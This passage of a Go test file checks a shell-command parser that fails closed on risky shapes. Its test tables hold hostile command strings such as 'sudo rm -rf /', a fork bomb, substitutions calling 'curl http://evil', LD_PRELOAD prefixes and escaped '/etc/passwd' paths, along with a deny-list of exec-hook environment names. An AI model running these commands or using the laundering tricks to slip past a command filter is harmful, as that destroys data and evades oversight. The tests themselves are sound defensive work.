		{"nohup does not launder a wrapper", "nohup sudo rm -rf /"},
		{"nohup with no inner command", "nohup"},

		// Review finding "important 4": the peelWrappers table now models each
		// wrapper's flag arity like peelTimeout does, and fails closed on any
		// flag outside the model — an unmodelled flag may take a separate value,
		// and eating the wrong word relabels argv[0].
		{"nice -n with no value", "nice -n"},
		{"nice with an unmodelled long flag", "nice --unmodelled 5 make"},
		{"nice with an unmodelled short flag", "nice -x make"},
		{"nice with a bare -- separator", "nice -- make"},
		{"nice with no inner command", "nice -n 5"},
		{"nice does not launder a wrapper", "nice -n 5 sudo rm -rf /"},
		{"stdbuf -o with no value", "stdbuf -o"},
		{"stdbuf with an unmodelled flag", "stdbuf --unmodelled 0 make"},
		{"stdbuf with no inner command", "stdbuf -o 0"},
		{"stdbuf does not launder a wrapper", "stdbuf -oL sudo rm -rf /"},
		// nohup accepts no options at all, so any flag-shaped word is a shape we
		// have not modelled rather than something safe to drop.
		{"nohup with a flag-shaped word", "nohup -x make"},
		// /usr/bin/time -o/-f take a separate value, and -o WRITES that value as
		// a file — a write no redirect capture ever sees. Unmodelled on purpose.
		{"time -o writes an unscoped file", `"time" -o /tmp/out make`},
		{"time -f takes a separate value", `"time" -f %e make`},
		{"time with an unmodelled flag", `"time" --unmodelled make`},
		// Change 0070 D4 moved the write-target DECISION out of the parser: a
		// redirect to a LITERAL out-target now parses and records the target on
		// the segment (TestSplitSegments_RedirectWriteTargets), so the scoping
		// layer — which has the root set the parser does not — can decide. What
		// stays shut here is every shape whose target we cannot name.
		{"redirect to variable target", "cat a > $F"},
		{"redirect to a command-substitution target", "cat a > $(echo x)"},
		{"append redirect to a variable target", "ls >> $LOG"},
		{"redirect to a target with an embedded expansion", `ls > "out-$N.txt"`},
		{"dup-op to a real file, not an fd", "ls >&file"},
		{"fd-close is not a bare fd number", "ls 2>&-"},
		{"read-write redirect <>", "cat <> scratch"},
		{"input redirect from a variable target", "cat < $F"},
		{"here-string", "cat <<< hi"},
		// An UNQUOTED here-doc body is expanded by the shell before it is fed to
		// stdin, so a substitution in the body genuinely runs. It is data only
		// when it is statically literal.
		{"here-doc body with a command substitution", "cat <<EOF\n$(rm -rf /)\nEOF"},
		{"here-doc body with a parameter expansion", "cat <<EOF\n$HOME\nEOF"},
		{"here-doc delimiter is not literal", "cat <<$D\nhi\nEOF"},
		// A statement that names no command still truncates its target, and a
		// recorded target with no segment to carry it is invisible to every
		// downstream layer. Fail closed rather than lose the write.
		{"redirect-only statement", "> out.txt"},
		{"redirect-only statement to a system path", "> /etc/passwd"},
		{"assignment-only statement with a redirect", "CI=1 > out.txt"},
		{"env-prints-environment with a redirect", "env CI=1 > out.txt"},

		// Change 0070 D3: control flow now descends (see TestSplitSegments), but
		// descent must not become a laundering channel.
		//
		// A FUNCTION DECLARATION IS DELIBERATELY NOT DESCENDED. collectStmt has
		// no *syntax.FuncDecl case and must never grow one: a declaration's body
		// does not run at declaration time, its call sites are invisible to an
		// argv classifier, and it is the recursion vehicle for the fork bomb
		// below. If a future "just add the remaining node types" edit adds the
		// case, this row goes red. That is the point of it.
		{"fork bomb function declaration", ":(){ :|:& };:"},
		{"plain function declaration", "f() { rm -rf /; }"},
		{"function keyword form", "function f { rm -rf /; }"},

		// The per-statement redirect guard runs BEFORE the type switch, so it
		// applies to each descended statement, not just the outermost one. Since
		// D4 a literal target is recorded rather than refused (see
		// TestSplitSegments_RedirectWriteTargets for the descended shapes); an
		// unnameable target inside a descended statement still fails the whole
		// command closed.
		{"unnameable redirect inside an if branch", "if true; then echo x > $F; fi"},
		{"unnameable redirect inside a for body", "for f in a b; do echo x > $F; done"},
		{"unnameable redirect inside a block", "{ echo x > $F; }"},
		{"unnameable redirect inside a subshell", "(echo x > $F)"},
		{"unnameable redirect on the compound statement itself", "for f in a b; do ls; done > $F"},

		// Descent does not launder a wrapper, a path-qualified argv[0], or a
		// dangerous env prefix — the descended statement faces every check a
		// top-level statement faces.
		{"subshell does not launder a wrapper", "(sudo rm -rf /)"},
		{"block does not launder a wrapper", "{ xargs rm; }"},
		{"if branch does not launder a wrapper", "if true; then sudo rm -rf /; fi"},
		{"else branch does not launder a wrapper", "if true; then ls; else sudo rm -rf /; fi"},
		{"elif chain does not launder a wrapper", "if true; then ls; elif false; then sudo rm -rf /; fi"},
		{"case branch does not launder a wrapper", "case foo in a) sudo rm -rf / ;; esac"},
		{"while body does not launder a wrapper", "while true; do sudo rm -rf /; done"},
		{"for body does not launder a path-qualified argv0", "for f in a b; do ./evil; done"},
		{"block does not launder a dangerous env prefix", "{ LD_PRELOAD=evil.so make; }"},

		// D3's INTERIM POSTURE has been lifted by D5. The five rows that stood
		// here — a for-loop header word, a for-body argument, a case
		// discriminant and a case pattern that are parameter expansions or
		// read-only command substitutions — now parse with an OPAQUE
		// representation and are pinned in TestSplitSegments_OpaqueArgs. That
		// flip was the declared purpose of D5; what stayed shut (an argv[0] we
		// cannot name, a substitution that is not read-only, a redirect target
		// we cannot name) is pinned in TestSplitSegments_OpaqueFailClosed.

		// A C-style for header is arithmetic, not a word list. It carries no
		// statement list we could descend and no words we could resolve, so it
		// stays on the fail-closed arm rather than being descended body-only.
		{"c-style for loop", "for ((i=0;i<10;i++)); do ls; done"},

		// Node types with no case are still fail-closed. Listed so that the
		// widening's boundary is visible.
		{"[[ ]] test clause", "[[ -f x ]]"},
		{"arithmetic command", "((1+1))"},
		{"let clause", "let x=1"},
		{"time clause", "time ls"},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			_, err := splitSegments(tc.cmd)
			if !errors.Is(err, ErrUnparseable) {
				t.Fatalf("splitSegments(%q) err = %v, want ErrUnparseable", tc.cmd, err)
			}
		})
	}
}

// TestSplitSegments_InertAssignsAreDropped asserts that an inert env prefix is
// *dropped*, not smuggled into the segment as an argument. If "CI=1" landed in
// Args, every downstream classifier — path scoping, the read-only safe-list,
// deny-rule matching — would inspect a word that is not an argument at all.
func TestSplitSegments_InertAssignsAreDropped(t *testing.T) {
	got, err := splitSegments("CI=1 NO_COLOR=1 go test ./...")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("expected 1 segment, got %d: %+v", len(got), got)
	}
	if got[0].Name != "go" {
		t.Errorf("Name = %q, want %q", got[0].Name, "go")
	}
	if !equalArgs(got[0].Args, []string{"test", "./..."}) {
		t.Fatalf("Args = %#v, want [test ./...]", got[0].Args)
	}
	for _, a := range got[0].Args {
		if strings.Contains(a, "=") && (strings.HasPrefix(a, "CI") || strings.HasPrefix(a, "NO_COLOR")) {
			t.Errorf("assignment %q leaked into Args: %#v", a, got[0].Args)
		}
	}
}

// TestSplitSegments_EnvPeelDropsAssignments is the D2 mirror of the D1
// assertion above: `env NAME=val cmd` must hand the classifier the inner
// command's own argv, with the assignment words dropped rather than smuggled in
// as arguments.
func TestSplitSegments_EnvPeelDropsAssignments(t *testing.T) {
	got, err := splitSegments("env CI=1 NO_COLOR=1 go test ./...")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("expected 1 segment, got %d: %+v", len(got), got)
	}
	if got[0].Name != "go" {
		t.Errorf("Name = %q, want %q", got[0].Name, "go")
	}
	if !equalArgs(got[0].Args, []string{"test", "./..."}) {
		t.Fatalf("Args = %#v, want [test ./...]", got[0].Args)
	}
}

// TestEnvAssignNameIsInert pins the inert-name ALLOWLIST itself, independent of
// the parser, so change 0070 D2 (env NAME=val peeling) reuses it with the same
// coverage as the D1 inline-prefix path.
//
// The two halves are not symmetric in cost. A name wrongly called inert is a
// silent auto-approve of whatever it hooks; a name wrongly called unproven is
// one human prompt. The notInert half therefore carries the names the previous
// denylist enumerated (they must stay shut) AND the toolchain hooks it forgot
// (review blocker 2) AND names nobody has classified at all — the last group is
// the whole reason the rule is an allowlist.
func TestEnvAssignNameIsInert(t *testing.T) {
	inert := []string{
		"CGO_ENABLED", "GOCACHE", "GOMAXPROCS", "GOOS", "GOARCH",
		"NO_COLOR", "FORCE_COLOR", "CLICOLOR", "CLICOLOR_FORCE", "TERM",
		"COLUMNS", "LINES", "TZ", "LANG", "LANGUAGE",
		"CI", "DEBUG", "VERBOSE", "RUST_BACKTRACE", "RUST_LOG",
		// LC_ prefix rule: every POSIX locale category.
		"LC_ALL", "LC_CTYPE", "LC_MESSAGES", "LC_NUMERIC", "LC_TIME",
	}
	for _, n := range inert {
		if !envAssignNameIsInert(n) {
			t.Errorf("envAssignNameIsInert(%q) = false, want true", n)
		}
	}
	notInert := []string{
		// The exec hooks the previous denylist enumerated.
		"LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "PATH", "IFS", "BASH_ENV",
		"ENV", "SHELL", "PS4", "PROMPT_COMMAND", "GIT_SSH_COMMAND", "GIT_ASKPASS",
		"SSH_ASKPASS", "PYTHONSTARTUP", "NODE_OPTIONS", "PERL5LIB", "RUBYOPT",
		"PAGER", "EDITOR", "VISUAL", "LESSOPEN", "LESSCLOSE", "SHELLOPTS",
		"BASHOPTS", "CDPATH", "DYLD_INSERT_LIBRARIES", "GIT_EXTERNAL_DIFF",
		"GIT_CONFIG_COUNT", "BASH_FUNC_x",
		// The build-toolchain hooks it FORGOT — the fail-open the inversion
		// closes. `make` and `go build` auto-approve, so each of these was an
		// arbitrary exec.
		"CC", "CXX", "LD", "AR", "RANLIB", "GOFLAGS", "GOENV", "GOROOT",
		"GOTOOLCHAIN", "CGO_CFLAGS", "CGO_CXXFLAGS", "CGO_LDFLAGS", "MAKEFLAGS",
		"LDFLAGS", "CFLAGS", "MAKE", "TERMINFO", "LOCPATH",
		// Names nobody has classified. Unproven is not benign.
		"FOO", "BAR", "NODE_ENV", "OLDPATH", "MY_PATH", "PATHOLOGICAL",
		"GITHUB_TOKEN", "GITOPS", "BASHRC_PATH", "LDAP_URL",
		// The allowlist is matched exactly and case-sensitively: a spelling we
		// do not recognise letter for letter is unproven.
		"ci", "Ci", "no_color", "lc_all", "Lang", "CGO_ENABLED_",
	}
	for _, n := range notInert {
		if envAssignNameIsInert(n) {
			t.Errorf("envAssignNameIsInert(%q) = true, want false", n)
		}
	}
}

func TestSplitSegments_ParseError(t *testing.T) {
	_, err := splitSegments("if then fi (")
	if !errors.Is(err, ErrUnparseable) {
		t.Fatalf("expected ErrUnparseable on parse error, got %v", err)
	}
}

func TestSplitSegments_Oversized(t *testing.T) {
	big := "ls " + strings.Repeat("a", maxCommandBytes)
	_, err := splitSegments(big)
	if !errors.Is(err, ErrUnparseable) {
		t.Fatalf("expected ErrUnparseable on oversized input, got %v", err)
	}
}

func equalArgs(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// opaqueSeg is a compact expectation for one parsed segment including the
// per-argument opaqueness flags (change 0070 D5).
type opaqueSeg struct {
	name   string
	args   []string
	opaque []bool
}

// TestSplitSegments_OpaqueArgs is the widening half of change 0070 D5: a word
// whose value is not statically known no longer sinks the whole command. It
// parses, but it is recorded as OPAQUE — a value the parser can name in the
// source text and can never resolve.
//
// The paired security half lives in
// TestClassifyHeuristic_OpaqueArgsNeverProveContainment: parsing an opaque arg
// is only safe because no layer downstream is ever allowed to treat it as a
// path. Read the two together.
func TestSplitSegments_OpaqueArgs(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []opaqueSeg
	}{
		{
			desc: "parameter expansion in argument position is opaque",
			cmd:  "rm $VAR",
			want: []opaqueSeg{{name: "rm", args: []string{"$VAR"}, opaque: []bool{true}}},
		},
		{
			desc: "braced parameter expansion is opaque",
			cmd:  "rm ${VAR}",
			want: []opaqueSeg{{name: "rm", args: []string{"${VAR}"}, opaque: []bool{true}}},
		},
		{
			desc: "literal args around an opaque one keep their index alignment",
			cmd:  "mv $SRC /tmp/x",
			want: []opaqueSeg{{name: "mv", args: []string{"$SRC", "/tmp/x"}, opaque: []bool{true, false}}},
		},
		{
			desc: "a word mixing literal and expansion is opaque as a whole",
			cmd:  "cp --out=$DIR/x y",
			want: []opaqueSeg{{name: "cp", args: []string{"--out=$DIR/x", "y"}, opaque: []bool{true, false}}},
		},
		{
			desc: "a double-quoted word carrying an expansion is opaque as a whole",
			cmd:  `touch "pre$VAR"`,
			want: []opaqueSeg{{name: "touch", args: []string{"pre$VAR"}, opaque: []bool{true}}},
		},
		{
			desc: "a read-only command substitution is opaque and surfaces its inner segment",
			cmd:  "git diff $(git rev-parse --show-toplevel)",
			want: []opaqueSeg{
				{name: "git", args: []string{"rev-parse", "--show-toplevel"}},
				{name: "git", args: []string{"diff", "$(git rev-parse --show-toplevel)"}, opaque: []bool{false, true}},
			},
		},
		{
			desc: "a backtick read-only substitution is opaque and surfaces its inner segment",
			cmd:  "echo `ls -la`",
			want: []opaqueSeg{
				{name: "ls", args: []string{"-la"}},
				{name: "echo", args: []string{"`ls -la`"}, opaque: []bool{true}},
			},
		},
		{
			desc: "a for-loop header word may be opaque (D3's interim posture flips here)",
			cmd:  "for f in $LIST; do ls; done",
			want: []opaqueSeg{{name: "ls"}},
		},
		{
			desc: "a for-loop header substitution surfaces its inner segment",
			cmd:  "for f in $(ls); do wc -l $f; done",
			want: []opaqueSeg{
				{name: "ls"},
				{name: "wc", args: []string{"-l", "$f"}, opaque: []bool{false, true}},
			},
		},
		{
			desc: "a case discriminant may be opaque",
			cmd:  "case $x in a) ls ;; esac",
			want: []opaqueSeg{{name: "ls"}},
		},
		{
			desc: "a case pattern may be opaque",
			cmd:  "case foo in $p) ls ;; esac",
			want: []opaqueSeg{{name: "ls"}},
		},
		{
			desc: "a default-value expansion with a literal fallback is opaque",
			cmd:  "cat ${F:-default.txt}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F:-default.txt}"}, opaque: []bool{true}}},
		},
		{
			desc: "an assign-default expansion with a literal fallback is opaque",
			cmd:  "cat ${F:=default.txt}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F:=default.txt}"}, opaque: []bool{true}}},
		},
		{
			desc: "an alternate-value expansion with a literal word is opaque",
			cmd:  "cat ${F:+alt.txt}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F:+alt.txt}"}, opaque: []bool{true}}},
		},
		{
			desc: "a prefix-strip expansion with a literal pattern is opaque",
			cmd:  "cat ${F#pre}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F#pre}"}, opaque: []bool{true}}},
		},
		{
			desc: "a suffix-strip expansion with a literal pattern is opaque",
			cmd:  "cat ${F%.txt}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F%.txt}"}, opaque: []bool{true}}},
		},
		{
			desc: "a replacement expansion with literal halves is opaque",
			cmd:  "cat ${F/a/b}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F/a/b}"}, opaque: []bool{true}}},
		},
		{
			desc: "a replacement expansion with an omitted replacement is opaque",
			cmd:  "cat ${F/a}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F/a}"}, opaque: []bool{true}}},
		},
		{
			desc: "an empty default-value expansion is opaque",
			cmd:  "cat ${F:-}",
			want: []opaqueSeg{{name: "cat", args: []string{"${F:-}"}, opaque: []bool{true}}},
		},
		{
			desc: "a length expansion is opaque",
			cmd:  "echo ${#F}",
			want: []opaqueSeg{{name: "echo", args: []string{"${#F}"}, opaque: []bool{true}}},
		},
		{
			desc: "a read-only substitution nested in a default value surfaces its inner segment",
			cmd:  "echo ${F:-$(git rev-parse --show-toplevel)}",
			want: []opaqueSeg{
				{name: "git", args: []string{"rev-parse", "--show-toplevel"}},
				{name: "echo", args: []string{"${F:-$(git rev-parse --show-toplevel)}"}, opaque: []bool{true}},
			},
		},
		{
			desc: "an opaque URL parses (the verdict layer, not the parser, refuses it)",
			cmd:  "curl $URL",
			want: []opaqueSeg{{name: "curl", args: []string{"$URL"}, opaque: []bool{true}}},
		},
		{
			desc: "an inert assignment prefix with an opaque arg parses",
			cmd:  "CI=1 curl $URL",
			want: []opaqueSeg{{name: "curl", args: []string{"$URL"}, opaque: []bool{true}}},
		},
		// An ANSI-C quoted word ($'…') carries an UNDECODED value in the AST:
		// syntax.SglQuoted{Dollar: true, Value: `\x2f`}, which the shell resolves
		// to `/`. Taking that value as a literal would hand every downstream
		// containment proof a string the shell will never see. The word is
		// therefore opaque and named by its raw source, exactly like $VAR.
		{
			desc: "an ANSI-C quoted word is opaque (its value is undecoded escape text)",
			cmd:  `rm -rf $'\x2f'`,
			want: []opaqueSeg{{name: "rm", args: []string{"-rf", `$'\x2f'`}, opaque: []bool{false, true}}},
		},
		{
			desc: "an ANSI-C quoted path is opaque",
			cmd:  `cat $'\x2fetc\x2fpasswd'`,
			want: []opaqueSeg{{name: "cat", args: []string{`$'\x2fetc\x2fpasswd'`}, opaque: []bool{true}}},
		},
		{
			desc: "an ANSI-C quoted word makes the whole mixed word opaque",
			cmd:  `rm -rf ./$'\x2e\x2e'`,
			want: []opaqueSeg{{name: "rm", args: []string{"-rf", `./$'\x2e\x2e'`}, opaque: []bool{false, true}}},
		},
		// The distinction is the leading `$`, and it is the whole point of
		// consulting SglQuoted.Dollar: an ORDINARY single-quoted word decodes to
		// nothing at all, so its value IS its text and it stays literal.
		{
			desc: "an ordinary single-quoted word is still literal",
			cmd:  `rm -rf 'lit eral'`,
			want: []opaqueSeg{{name: "rm", args: []string{"-rf", "lit eral"}, opaque: []bool{false, false}}},
		},
		{
			desc: "an ordinary single-quoted word carrying backslashes is still literal",
			cmd:  `cat './a\x2fb'`,
			want: []opaqueSeg{{name: "cat", args: []string{`./a\x2fb`}, opaque: []bool{false}}},
		},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) = %+v, want %d segments", tc.cmd, got, len(tc.want))
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %v, want %v", i, got[i].Args, w.args)
				}
				for j := range got[i].Args {
					want := j < len(w.opaque) && w.opaque[j]
					if got[i].isOpaque(j) != want {
						t.Errorf("segment %d arg %d (%q) isOpaque = %v, want %v",
							i, j, got[i].Args[j], got[i].isOpaque(j), want)
					}
				}
			}
		})
	}
}

// TestSegmentOpaque_ParallelSliceInvariant guards the one representation bug
// this design can have: Opaque is index-aligned with Args, and a length skew
// would silently read "not opaque" — the fail-OPEN direction — at every call
// site. Opaque is therefore either empty (no opaque args at all) or exactly as
// long as Args, and isOpaque/hasOpaqueArg fail toward opaque on any skew.
func TestSegmentOpaque_ParallelSliceInvariant(t *testing.T) {
	corpus := []string{
		"rm $VAR", "mv $SRC /tmp/x", "ls -la", "git diff $(git rev-parse --show-toplevel)",
		"CI=1 timeout 30 go test ./...", "env CI=1 make $TARGET", "nohup go build",
		"for f in $(ls); do wc -l $f; done", "cat a | grep $PAT", "go build > out.log",
		`bash -c 'rm $VAR'`, "cp --out=$DIR/x y", "echo `ls`",
	}
	for _, cmd := range corpus {
		segs, err := splitSegments(cmd)
		if err != nil {
			t.Fatalf("splitSegments(%q) unexpected error: %v", cmd, err)
		}
		for i, s := range segs {
			if len(s.Opaque) != 0 && len(s.Opaque) != len(s.Args) {
				t.Fatalf("%q segment %d: len(Opaque)=%d, len(Args)=%d — parallel-slice skew",
					cmd, i, len(s.Opaque), len(s.Args))
			}
		}
	}

	// A hand-built segment with no Opaque slice reads as fully non-opaque (the
	// shape every pre-D5 construction site and test fixture produces).
	plain := Segment{Name: "sed", Args: []string{"-n", "1,5p", "file"}}
	if plain.hasOpaqueArg() || plain.isOpaque(0) {
		t.Errorf("a segment with no Opaque slice must read as non-opaque")
	}
	// A SKEWED segment must fail toward opaque, never toward "not opaque".
	skewed := Segment{Name: "rm", Args: []string{"a", "b", "c"}, Opaque: []bool{false}}
	if !skewed.hasOpaqueArg() {
		t.Errorf("a skewed Opaque slice must report hasOpaqueArg() = true")
	}
	for i := range skewed.Args {
		if !skewed.isOpaque(i) {
			t.Errorf("a skewed Opaque slice must report isOpaque(%d) = true", i)
		}
	}
	// Out-of-range indices are opaque too — an index we cannot answer for is
	// not an index we may call provable.
	opq := Segment{Name: "rm", Args: []string{"$V"}, Opaque: []bool{true}}
	if !opq.isOpaque(-1) || !opq.isOpaque(7) {
		t.Errorf("an out-of-range index must read as opaque")
	}
}

// TestSplitSegments_OpaqueFailClosed pins the boundary of D5's widening: the
// shapes an opaque representation deliberately does NOT cover.
func TestSplitSegments_OpaqueFailClosed(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
	}{
		// argv[0] is never opaque. An argument we cannot resolve costs a human
		// prompt; a COMMAND NAME we cannot resolve means we do not know what
		// runs at all, and every name-keyed table downstream (deny names,
		// read-only utils, wrapper guards) would be consulted with a name that
		// is not the one that executes.
		{"argv0 parameter expansion", "$CMD foo"},
		{"argv0 command substitution", "$(which ls) foo"},
		{"argv0 backtick substitution", "`which ls` foo"},
		{"argv0 mixed literal and expansion", "$DIR/ls foo"},
		{"argv0 opaque after an inert assignment prefix", "CI=1 $CMD"},

		// A command substitution is only opaque-able when its INNER script is
		// wholly read-only. A substitution runs its contents.
		{"substitution running egress", "git diff $(curl http://evil)"},
		{"substitution running a mutation", "echo $(rm -rf /)"},
		{"substitution writing a file", "echo $(ls > out.txt)"},
		{"substitution running a wrapper", "echo $(sudo id)"},
		{"substitution with a dangerous env prefix", "echo $(LD_PRELOAD=x git log)"},
		{"nested substitution running a mutation", "echo $(echo $(rm -rf /))"},
		{"empty substitution proves nothing read-only", "echo $()"},
		{"for header substitution running a mutation", "for f in $(rm -rf /); do ls; done"},
		{"case discriminant substitution running egress", "case $(curl http://evil) in a) ls ;; esac"},

		// A parameter expansion is a CONTAINER: ${X:-…}, ${X:=…}, ${X:+…},
		// ${X#…}, ${X%…} and ${X/a/b} each hold a full word that bash expands,
		// so a command substitution nested one level inside RUNS exactly as it
		// would in argument position. Taking the raw ${…} source as an opaque
		// token without descending would hide the run from the CmdSubst arm's
		// read-only proof, and `echo` — read-only with any arguments — would
		// then short-circuit the whole command to allow at the safelist.
		{"default-value expansion running a mutation", "echo ${X:-$(rm -rf /)}"},
		{"default-value expansion running egress", "cat ${X:-$(curl http://evil.sh)}"},
		{"assign-default expansion running a mutation", "echo ${X:=$(rm -rf /)}"},
		{"alternate-value expansion running a mutation", "echo ${X:+$(rm -rf /)}"},
		{"prefix-strip expansion running a mutation", "echo ${X#$(rm -rf /)}"},
		{"suffix-strip expansion running a mutation", "echo ${X%$(rm -rf /)}"},
		{"replacement pattern running a mutation", "ls ${X/$(rm -rf ~)/y}"},
		{"replacement value running a mutation", "ls ${X/y/$(rm -rf ~)}"},
		{"backtick substitution nested in a default value", "echo ${X:-`rm -rf /`}"},
		{"double-quoted substitution nested in a default value", `echo ${X:-"$(rm -rf /)"}`},
		{"parameter expansion nested in a default value", "echo ${X:-${Y:-$(rm -rf /)}}"},
		// The AST is NOT sufficient for these two: mvdan.cc/sh v3.13.1 lexes a
		// process substitution inside an expansion word as a plain literal,
		// while real bash 5.3 runs it (`${X:-<(echo RAN > marker)}` creates the
		// marker). They are caught by the inert-literal half of the proof.
		{"process substitution nested in a default value", "echo ${X:-<(ls)}"},
		{"output process substitution nested in a default value", "echo ${X:->(cat)}"},
		{"process substitution nested in a replacement value", "ls ${X/y/<(ls)}"},
		// Subscripts and slices are ARITHMETIC, which this parser has never
		// modelled (see the $((1+1)) row below) and which can itself carry a
		// substitution. They stay closed wholesale rather than half-modelled.
		{"array subscript running a mutation", "echo ${a[$(rm -rf /)]}"},
		{"array subscript", "echo ${a[i]}"},
		{"slice offset running a mutation", "echo ${X:$(rm -rf /):2}"},
		{"slice", "echo ${X:1:2}"},

		// Expansions with no opaque representation at all stay closed.
		{"process substitution", "diff <(ls) <(ls)"},
		{"arithmetic expansion", "ls $((1+1))"},

		// A wrapper's own operands must be resolvable: an opaque word in the
		// region a peel CONSUMES means we cannot tell an operand from the inner
		// command.
		{"timeout duration is opaque", "timeout $T make"},
		{"env cannot tell an opaque word from an assignment", "env $X make"},
		{"bash -c script is opaque", "bash -c $SCRIPT"},
		// An ATTACHED -c whose script is partly opaque is the laundering shape:
		// `bash -c"rm x"$X` would otherwise peel to a segment claiming the
		// script is `rm x$X`, while bash runs `rm x` concatenated with whatever
		// $X expands to — `rm x -rf /` for $X=" -rf /". A script we cannot read
		// in full is a script we cannot decompose at all.
		{"bash -c with a partly-opaque attached script", `bash -c"rm x"$X`},
		{"bash -c with a fully-opaque attached script", "bash -c$SCRIPT"},
		// The same laundering through the SPACED -c form: the script word is a
		// single double-quoted run carrying an expansion, so its text reads as
		// `rm x$X` while bash runs `rm x` glued to whatever $X expands to.
		{"bash -c with a partly-opaque script word", `bash -c "rm x$X"`},

		// A redirect target is NOT an argument: D4's write targets have no
		// opaque representation and stay closed (an unnameable write is a write
		// no layer can scope).
		{"redirect to an opaque target", "ls > $F"},
		{"redirect to a substituted target", "ls > $(echo x)"},

		// An ANSI-C quoted word is not a literal, so the three literalWord
		// positions lose it too — and each must land FAIL-CLOSED rather than
		// treating the undecoded escape text as the value. `$'/dev/null'` is the
		// benign case that shows the direction (it costs one prompt);
		// `$'\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c'`-shaped targets are why.
		{"redirect to an ANSI-C quoted /dev/null", `ls > $'/dev/null'`},
		{"fd-dup to an ANSI-C quoted number", `ls 2>&$'1'`},
		{"here-doc with an ANSI-C quoted delimiter", "cat <<$'EOF'\nx\nEOF"},
		{"env assignment value in ANSI-C quotes", `CI=$'\x31' rm -rf x`},
		// argv[0] is never opaque, and an ANSI-C quoted name is no exception:
		// `$'\x6c\x73'` executes `ls` while every name-keyed table downstream
		// would be consulted with the escape text.
		{"argv0 in ANSI-C quotes", `$'\x6c\x73' foo`},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			_, err := splitSegments(tc.cmd)
			if !errors.Is(err, ErrUnparseable) {
				t.Fatalf("splitSegments(%q) err = %v, want ErrUnparseable", tc.cmd, err)
			}
		})
	}
}

// TestSplitSegments_DockerParses pins the parse-floor half of change 0072:
// docker left arbitraryArgWrappers, so docker commands now parse into ordinary
// segments (and thereby become reachable by deny/always_prompt/auto_approve
// patterns and the classifier). The host-execution wrappers stay fail-closed —
// pinned here so the removal is provably scoped to docker alone.
func TestSplitSegments_DockerParses(t *testing.T) {
	got, err := splitSegments("docker compose config --quiet")
	if err != nil {
		t.Fatalf("splitSegments(docker compose config --quiet) err = %v, want nil", err)
	}
	if len(got) != 1 || got[0].Name != "docker" {
		t.Fatalf("segments = %+v, want one docker segment", got)
	}
	wantArgs := []string{"compose", "config", "--quiet"}
	if len(got[0].Args) != len(wantArgs) {
		t.Fatalf("args = %v, want %v", got[0].Args, wantArgs)
	}
	for i, a := range wantArgs {
		if got[0].Args[i] != a {
			t.Fatalf("args = %v, want %v", got[0].Args, wantArgs)
		}
	}
	// The remaining arbitrary-arg wrappers run their payload on the HOST and
	// must keep failing closed at the parse floor.
	for _, cmd := range []string{"sudo ls", "xargs rm", "npx cowsay hi", "eval ls", "watch date"} {
		if _, err := splitSegments(cmd); err == nil {
			t.Errorf("splitSegments(%q) parsed; host-execution wrappers must stay fail-closed", cmd)
		}
	}
}
